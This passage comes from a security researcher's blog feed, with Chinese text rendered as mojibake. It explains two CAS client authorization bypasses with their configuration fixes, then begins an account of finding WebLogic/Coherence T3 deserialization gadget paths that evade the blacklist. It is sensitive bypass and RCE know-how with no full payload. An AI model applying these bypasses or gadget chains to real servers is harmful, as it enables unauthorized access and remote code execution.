class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·é…ç½®çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰é—®é¢˜<br><img src="20210510105915-b44b6e76-b13b-1.png" alt="image.png"></p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>ä½†æ˜¯å…¶å®å¯ä»¥è¢«èŠ±å¼ç»•è¿‡ã€‚</p><p><img src="20210510105932-bea9e8de-b13b-1.png" alt="image.png"></p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åŸå› æœ‰ä¸¤ç‚¹ï¼Œç¬¬ä¸€org.jasig.cas.client.authentication.AuthenticationFilterï¼Œåœ¨åŒ¹é…æ—¶å€™è·å–äº†åŸç”Ÿurlï¼ˆæœªå¤„ç†../ï¼‰ï¼Œç”šè‡³åŒ…æ‹¬<code>?</code> åçš„å†…å®¹ã€‚</p><p><img src="20210510105946-c6c565ca-b13b-1.png" alt="image.png"></p><p>ç¬¬äºŒï¼Œfilterçš„åŒ¹é…æ¨¡å¼æœ‰å››ç§ï¼Œé»˜è®¤æ˜¯æŒ‰æ­£åˆ™åŒ¹é…ã€‚<br><img src="20210510105953-cb7b4b34-b13b-1.png" alt="image.png"></p><p><img src="20210510110002-d0cd2f3a-b13b-1.png" alt="image.png"></p><p>åŒç†å¦‚æœé…ç½®æˆCONTAINSä¹Ÿä¼šæœ‰ç±»ä¼¼çš„é—®é¢˜ã€‚</p><p>åŒç†å°è£…äº†è¿™ä¸ªåº“çš„ä¸‰æ–¹åº“ä¹Ÿä¼šæœ‰é—®é¢˜ï¼Œæ¯”è¾ƒæµè¡Œçš„æ˜¯<strong><a href="https://github.com/Unicon/cas-client-autoconfig-support">cas-client-autoconfig-support</a></strong>  ï¼Œå®ƒå¸¸ä¸springbooté›†æˆä½¿ç”¨ï¼Œå¦‚æœæœ‰å¦‚ä¸‹é…ç½®ä¹Ÿä¼šå‡ºé—®é¢˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cas.ignorePattern&#x3D;&#x2F;api&#x2F;guest</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>æ‰€ä»¥æ­£ç¡®çš„é…ç½®åº”è¯¥æ”¹ä¸º</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>^/api/guest$<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªå¯ä»¥ç®—æ´ï¼ˆæ²¡å¤„ç†../è€Œä¸”containsè¿™ç§é€‰é¡¹å°±ä¸åº”è¯¥å­˜åœ¨ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”©é”…ç»™å¼€å‘æ²¡ä»”ç»†çœ‹æ–‡æ¡£ã€‚</p><h2 id="bypass-trick2-useSuffixPatternMatch"><a href="#bypass-trick2-useSuffixPatternMatch" class="headerlink" title="bypass trick2 useSuffixPatternMatch"></a>bypass trick2 useSuffixPatternMatch</h2><h3 id="åœºæ™¯-1"><a href="#åœºæ™¯-1" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>è¿™é‡Œå‡è®¾/adminç³»åˆ—çš„è·¯ç”±éƒ½ä¸å…è®¸è®¿é—®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(</span><br><span class="line">            value = &#123;<span class="string">"/admin"</span>&#125;,</span><br><span class="line">            method = &#123;RequestMethod.GET&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(</span><br><span class="line">            value = &#123;<span class="string">"/admin/api"</span>&#125;,</span><br><span class="line">            method = &#123;RequestMethod.GET&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ¬¡å¼€å‘è®¤çœŸçœ‹äº†æ–‡æ¡£åšäº†ä»¥ä¸‹é…ç½®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.CasClientConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.EnableCasClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> today.redteam.aop.CasAspect;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableCasClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CasConfig</span> <span class="keyword">extends</span> <span class="title">CasClientConfigurerAdapter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CasConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureAuthenticationFilter</span><span class="params">(FilterRegistrationBean authenticationFilter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.configureAuthenticationFilter(authenticationFilter);</span><br><span class="line">        authenticationFilter.addUrlPatterns(<span class="keyword">new</span> String[]&#123;<span class="string">"/admin/*"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">"cas.serverUrlPrefix"</span>, <span class="string">"https://cashost.com/cas"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.serverLoginUrl"</span>, <span class="string">"https://cashost.com/cas/login"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.clientHostUrl"</span>, <span class="string">"http://localhost:8888/"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.validationType"</span>, <span class="string">"CAS"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/adminè¿™ä¸ªè·¯ç”±çœ‹èµ·æ¥ä¼¼ä¹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p><p><img src="20210510110128-03982a3c-b13c-1.png" alt="image.png"></p><p>å¸¸è§„çš„ç»•è¿‡æ–¹å¼ä¹Ÿä¸èµ·ä½œç”¨<br><img src="20210510110137-08f100da-b13c-1.png" alt="image.png"></p><p><img src="20210510110143-0cb5c50c-b13c-1.png" alt="image.png"></p><h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>ä½†åœ¨ä½ç‰ˆæœ¬çš„springbootä¸Šè¿˜æ˜¯èƒ½ç»•è¿‡ï¼ˆæœ¬åœ°ç¯å¢ƒæ˜¯1.5.9.RELEASEï¼‰ã€‚</p><p><img src="20210510110208-1bc8fab4-b13c-1.png" alt="image.png"></p><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åŸç†æ˜¯åœ¨springboot 1.xä¸­useSuffixPatternMatché»˜è®¤ä¸ºtrueï¼Œspringbootä¼šå¯¹è·¯ç”±è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚</p><p>æ–­ç‚¹ä¸‹åœ¨org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatternã€‚</p><p><img src="20210510110222-23f07f6e-b13c-1.png" alt="image.png"></p><p>/admin.*è‡ªç„¶èƒ½åŒ¹é…ä¸Š/admin.ä¹Ÿå°±ç»•è¿‡äº†ã€‚</p><h3 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>å¦‚ä¸‹å…³é—­setUseSuffixPatternMatchæˆ–å‡çº§åˆ°2.x</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HandlerMapping <span class="title">requestMappingHandlerMapping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RequestMappingHandlerMapping mapping = <span class="keyword">new</span> RequestMappingHandlerMapping();</span><br><span class="line">        mapping.setUseSuffixPatternMatch(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> mapping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      cas client ç”¨äºé™åˆ¶åŒ¿åç”¨æˆ·å¯¹æŸäº›ç‰¹å®šapiçš„è®¿é—®ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šçš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šæœ‰æƒé™ç»•è¿‡é—®é¢˜ã€‚ä¸‹é¢åˆ†äº«ä¸¤ä¸ªå®é™…ç”Ÿæ´»ä¸­é‡åˆ°çš„æ¡ˆä¾‹ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>How Did I Find Weblogic T3 RCE</title>
    <link href="https://cl0und.github.io/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/"/>
    <id>https://cl0und.github.io/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/</id>
    <published>2021-08-31T12:26:16.000Z</published>
    <updated>2021-08-31T12:54:28.389Z</updated>
    
    <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äº<a href="https://xz.aliyun.com/t/9068">å…ˆçŸ¥ç¤¾åŒº</a><br>â€‹<br>è·å¾—å™±å¤´oracleå…¬å¼€è‡´è°¢</p><!-- more --><p><img src="image-20210120160134548.png" alt="image-20210120160134548.png"><br>ä¹‹å‰è¿™ä¸ªè¡¥ä¸æ²¡æœ‰ä¿®å¥½ï¼Œæœ‰CVE-2021-2135å’ŒCVE-2021-2136ä¸¤ç§ç»•è¿‡ã€‚<br><img src="image-1.png" alt="image-1.png"><br>æŒ–ä¸åŠ¨ï¼ŒæŠŠä¹‹å‰æ€è·¯å†å‘å‡ºæ¥ï¼Œç­‰ä¸‹ä¸ªè¡¥ä¸æ—¥å‘å¸ˆå‚…ä»¬å­¦ä¹ äº†ã€‚</p><h2 id="CASE-1"><a href="#CASE-1" class="headerlink" title="CASE 1"></a>CASE 1</h2><p>æœ€åˆå¼•èµ·æˆ‘æ³¨æ„çš„æ˜¯ExternalizableLite#readExternalizableLiteï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œç›´æ¥ä»æ•°æ®æµé‡Œé¢è¯»å–äº†ç±»åå¹¶æ–°å»ºå¯¹è±¡ã€‚<br><img src="image-20201115104803787.png" alt="image-20201115104803787.png"><br>ä¸‹é¢åˆä¼šè°ƒç”¨valueè‡ªèº«çš„readExternal((DataInput)in)æ–¹æ³•ã€‚<br>æ–°å»ºå‡ºæ¥çš„å¯¹è±¡ä¼šè°ƒç”¨è‡ªå·±çš„readExternalã€‚<br><img src="image-20201115105149062.png" alt="image-20201115105149062.png"><br>å½“å¯¹è±¡æ„é€ å¥½ä¹‹ååˆä¼šåœ¨realizeä¸­è°ƒç”¨readResolveæ–¹æ³•<br><img src="image-20201122194515676.png" alt="image-20201122194515676.png"><br><img src="image-20201122194554729.png" alt="image-20201122194554729.png"><br>ç»“åˆè¿™é‡Œä¸‰ç‚¹æ¥çœ‹ï¼Œç›¸å½“äºæ˜¯ä¸€ä¸ªå…é»‘åå•æ£€æŸ¥çš„ååºåˆ—åŒ–åœºæ™¯ã€‚<br>æˆ‘ä»¬åªéœ€è¦å¾€ä¸Šå›æœ”ï¼Œçœ‹èƒ½å¦åˆ°ååºåˆ—åŒ–çš„å…¥å£ç‚¹å°±è¡Œäº†ã€‚<br><img src="image-20201115105910924.png" alt="image-20201115105910924.png"><br><img src="image-20201115105938644.png" alt="image-20201115105938644.png"></p><p><img src="image-20201115110032708.png" alt="image-20201115110032708.png"><br><img src="image-20201115110126348.png" alt="image-20201115110126348.png"><br>ç„¶åå…¨å±€æœcom.tangosol.util.ExternalizableHelper#readObject(java.io.DataInput)ï¼Œå¯ä»¥åœ¨å¾ˆå¤šç±»çš„readExternal(java.io.DataInput)ä¸­çœ‹åˆ°è¿™æ ·çš„è°ƒç”¨ã€‚<br><img src="image-20201115111618606.png" alt="image-20201115111618606.png"><br>å›æœ”åˆ°è¿™ä¸€æ­¥çš„æ—¶å€™æˆ‘è¿˜ä»¥ä¸ºæˆäº†ï¼Œä½†æ˜¯æµ‹äº†ä¸€ä¸‹å‘ç°ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™javaæ ¹æœ¬ä¸ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚å› ä¸ºè¿™é‡Œå‡½æ•°çš„ç­¾åæ˜¯readExternal(java.io.DataInput)è€Œä¸æ˜¯æ­£ç»Ÿçš„readExternal(java.io.ObjectInput)ã€‚</p><p>æœ‰äº›ä¸ç”˜å¿ƒï¼Œäºæ˜¯ä¹æŠŠcoherence.jaré‡Œé¢çš„readExternal(java.io.ObjectInput)å…¨éƒ¨æŠ“äº†å‡ºæ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br></pre></td></tr></table></figure><p>æ•°é‡ä¸æ˜¯å¾ˆå¤šï¼Œä¸€ä¸ªä¸€ä¸ªæ‰‹å·¥çœ‹ã€‚å¾ˆå¿«å•Šï¼Œæˆ‘å•ªä¸€ä¸‹å°±ç‚¹åˆ°com.oracle.common.internal.util.Histogram#readExternal(java.io.ObjectInput)é‡Œé¢äº†ã€‚<br><img src="image-20201122163616331.png" alt="image-20201122163616331.png"><br>è¿™ä¸ªåœ°æ–¹æœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œé‚£ä¹ˆåˆšæ‰çš„é“¾è·¯ä¸å°±ç»­ä¸Šäº†ï¼Ÿ<br>ç»§ç»­è·Ÿè¿›ï¼Œå†ä¸€æ¬¡å¤±æœ›ï¼Œå‘ç°è¿™é‡Œåªè¯»å–é•¿æ•´å‹ï¼Œå¹¶æ²¡æœ‰è°ƒç”¨readObjectã€‚<br><img src="image-20201122163730081.png" alt="image-20201122163730081.png"></p><p>ç„¶åæ¥ä¸‹æ¥çš„æ‰€æœ‰ç±»è¦ä¹ˆæ˜¯è½¬æ¢æˆäº†DataInputä½†æ˜¯æ²¡æœ‰readObjectã€‚è¦ä¹ˆæ˜¯æ ¹æœ¬å°±æ²¡æœ‰å¼ºåˆ¶è½¬æ¢ã€‚</p><p>è¿˜æ˜¯ä¸ç”˜å¿ƒï¼Œåˆçœ‹äº†ä¸€éï¼Œåœ¨com.tangosol.net.security.PermissionInfo#readExternal(java.io.ObjectInput)å¤„äº‹æƒ…å‡ºç°è½¬æœºã€‚<br><img src="image-20201122164228358.png" alt="image-20201122164228358.png"><br>æˆ‘å‘ç°åœ¨è°ƒç”¨readCollectionçš„æ—¶å€™ä¼ å…¥çš„ObjectInput inä¼šè¢«éšå¼è½¬æ¢æˆDataInput inï¼Œå¹¶ä¸”é‡Œé¢åˆšå¥½æœ‰readObjectã€‚<br><img src="image-20201122164413735.png" alt="image-20201122164413735.png"></p><p>åˆ°è¿™é‡Œä¸€æ¡ä»readExternal(java.io.ObjectInput) åˆ°æ— è§†é»‘åå•çš„ååºåˆ—åŒ–è·¯çº¿åœ¨ç†è®ºä¸Šä¼¼ä¹å·²æ‰“é€šï¼Œæ¥ä¸‹æ¥çš„å°±æ˜¯gadgetååŠæ®µæ˜¯é€‰æ‹©ï¼Œç«‹é©¬æƒ³åˆ°çš„æ˜¯TemplatesImplå’ŒRemoteConstructorï¼ˆCVE-2020-14644ï¼‰ã€‚æˆ‘é€‰æ‹©äº†åè€…ï¼ŒæŠŠpayloadæ„é€ å¥½ï¼Œå†æ‰“ä¸Š10æœˆè¡¥ä¸ï¼ˆæ„Ÿè°¢ç»™æˆ‘è¡¥ä¸çš„å¸ˆå‚…ï¼‰ä¸€å‘å…¥é­‚ã€‚</p><p>psï¼šè¿™é‡ŒreadExternal(java.io.ObjectInput) -&gt; æ— è§†é»‘åå•çš„readObjectçš„ç»“è®ºæ˜¯ä¸ä¸¥è°¨çš„ï¼Œé€‰æ‹©TemplatesImplä¹Ÿæ˜¯æ‰“ä¸é€šçš„ï¼Œè¿™ä¸ªåŸå› åé¢ä¼šè§£é‡Šã€‚ç¡®å®å¾ˆå°´å°¬ï¼Œè™½ç„¶èƒ½RCEï¼Œä½†æ˜¯å½“æ—¶æ€¥äºéªŒè¯å¹¶æœªå…¨æµç¨‹è°ƒè¯•è¿‡ï¼Œå¯¹è¿™ä¸ªæ´çš„ç†è§£æ¯”è¾ƒç‰‡é¢ã€‚</p><p>è‡³æ­¤ç¬¬ä¸€ä¸ªæ´å°±ç»“æŸäº†ï¼Œå½“æ™šå°±ç»™å®˜æ–¹ææ¼æ´ã€‚åé¢çš„å‡ å¤©æˆ‘åœ¨åæ€è¿™ä¸ªæ´ï¼Œ</p><ol><li>ä¸ºä»€ä¹ˆæˆ‘èƒ½æŒ–åˆ°ï¼Ÿæˆ‘æƒ³æˆ‘èƒ½æŒ–åˆ°åŸå› æ˜¯<del>weblogicå®˜æ–¹æ²¡æœ‰bug bounty</del>å‰äººå¯èƒ½æ²¡æœ‰æ³¨æ„åˆ°æœ‰è¿›å…¥åˆ°readExternal(DataInput in)é€šè·¯ã€‚</li><li>ä¸ºä»€ä¹ˆreadExternal(ObjectInput in)å¯ä»¥ç»­ä¸Šï¼Ÿæˆ‘æƒ³å› ä¸ºreadExternalæœ¬æ¥å°±æ˜¯ç»™ç¨‹åºå‘˜è‡ªå®šä¹‰ååºåˆ—åŒ–æ•°æ®çš„åœ°æ–¹ï¼Œè€ŒreadExternal(DataInput in)é‡Œé¢æ˜¯coherenceè‡ªå·±çš„ååºåˆ—åŒ–é€»è¾‘ï¼Œæ‰€ä»¥ä»ObjectInput inèƒ½åˆ°DataInput inç®—æ˜¯é¢˜ä¸­åº”æœ‰ä¹‹ä¹‰ã€‚</li><li>è¿™ç§ååºåˆ—åŒ–ç»•è¿‡æ–¹å¼å±äºå“ªç§ç±»å‹ï¼Ÿæˆ‘æƒ³åº”è¯¥æ˜¯äºŒé˜¶ååºåˆ—åŒ–ç±»å‹ã€‚</li></ol><h2 id="CASE-2"><a href="#CASE-2" class="headerlink" title="CASE 2"></a>CASE 2</h2><p>å‡ å¤©åï¼Œæˆ‘æ”¶åˆ°äº†å®˜æ–¹å›å¤çš„é‚®ä»¶ï¼Œä»å®ƒä»¬å›å¤ä¸­å¯ä»¥çœ‹åˆ°å®ƒä»¬æŠŠè¿™ä¸ªé“¾å…³é”®è®¤å®šä¸ºRCE involving LambdaIdentityã€‚æ­¤æ—¶ï¼Œæˆ‘è§‰å¾—å¾ˆå¥‡æ€ªéš¾é“ååŠæ®µä¸æ˜¯å¯ä»¥çµæ´»å—ï¼Ÿå¦‚æœæˆ‘é‡æ–°æ‰¾ä¸€ä¸ªæ–°å…¥å£é…ä¸Š7u21ååŠæ®µå²‚ä¸æ˜¯èƒ½å†æ··ä¸€ä¸ªCVEï¼Ÿã€‚ç„¶åæŠ“äº†ä¸€ä¸‹æ•´ä¸ªcoherence libç›®å½•ä¸‹çš„æ‰€æœ‰jaråŒ…çš„readExternal(java.io.ObjectInput) ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br><span class="line">com.tangosol.coherence.servlet.AbstractHttpSessionModel</span><br><span class="line">com.tangosol.coherence.servlet.AttributeHolder</span><br></pre></td></tr></table></figure><p>å€’æ•°ä¸¤ä¸ªæ˜¯æ¯”ä¸Šæ¬¡åªè·‘conherence.jarå¤šå‡ºæ¥çš„ï¼Œç»è¿‡éªŒè¯åœ¨conherence-web.jarä¸­çš„com.tangosol.coherence.servlet.AttributeHolderæ»¡è¶³æ¡ä»¶ã€‚<br><img src="image-20201122174447449.png" alt="image-20201122174447449.png"><br>æŠŠTemplatesImplæ‰“åˆ°m_Valueä¹‹åï¼Œå‘é€payloadåå‘ç°æ§åˆ¶å°æŠ¥é”™ã€‚å‘ç”Ÿè‚¾ä¹ˆäº‹äº†ï¼Ÿæˆ‘ä¸€çœ‹ï¼Œå“¦åŸæ¥å•Šæ˜¯æ²¡è¿‡é»‘åå•ï¼Œè¿™å°±å¼•èµ·äº†å¯¹è¿™ä¸ªæ¼æ´ç»†èŠ‚çš„è¿›ä¸€æ­¥æ¢ç©¶ã€‚<br><img src="image-20201122191637309.png" alt="image-20201122191637309.png"><br>åœ¨com.tangosol.util.ExternalizableHelper#readObjectInternalä¸‹æ–­ç‚¹å¯ä»¥çœ‹åˆ°å®ƒå¹¶æ²¡è¿›å…¥ï¼Œé¢„æœŸçš„readExternalizableLiteè€Œæ˜¯è¿›å…¥äº†readSerializableä¸­<br><img src="image-20201122192730759.png" alt="image-20201122192730759.png"><br>åœ¨readObjectä¸­DataInput inä¼šé‡æ–°â€œè½¬æ¢â€å›å¸¦é»‘åå•çš„InputStreamï¼Œæ‰€ä»¥å¤±è´¥ã€‚<br><img src="image-20201122192854446.png" alt="image-20201122192854446.png"><br>æ­¤æ—¶ï¼Œå¿ƒç†åˆæœ‰ä¸¤ä¸ªç–‘é—®</p><ol><li>è¾“å…¥æµä¸ºæˆ‘æ‰€æ§ï¼Œé‚£æˆ‘æŠŠnTypeæ”¹æˆ10ï¼Œå¼ºè¡Œè¿›å…¥readExternalizableLiteè¡Œä¸è¡Œï¼Ÿ</li><li>ä¸ºä»€ä¹ˆRemoteConstructorå¯ä»¥æ‰“æˆåŠŸï¼Ÿ</li></ol><p>é¦–å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä½†æ˜¯è¡Œä¸é€šï¼Œå°±ç®—çœŸçš„æŠŠTemplatesImpl newå‡ºæ¥äº†ä¹‹åçš„å¼ºè½¬ä¹Ÿè¿‡ä¸äº†ã€‚<br><img src="image-20201122193516298.png" alt="image-20201122193516298.png"><br>å…¶æ¬¡ï¼Œå°±ç®—çœŸçš„æˆåŠŸä»–ä¹Ÿæ²¡æœ‰readExternalæ–¹æ³•ï¼ˆå³æ²¡æœ‰å®ç°ExternalizableLiteæ¥å£ï¼‰ã€‚<br><img src="image-20201122193856818.png" alt="image-20201122193856818.png"><br>åˆ°è¿™é‡ŒRemoteConstructorå¯ä»¥æ‰“çš„åŸå› ä¹Ÿå¾ˆæ˜æ˜¾äº†RemoteConstructorå®ç°äº†ExternalizableLiteæ¥å£ã€‚<br><img src="image-20201122194211848.png" 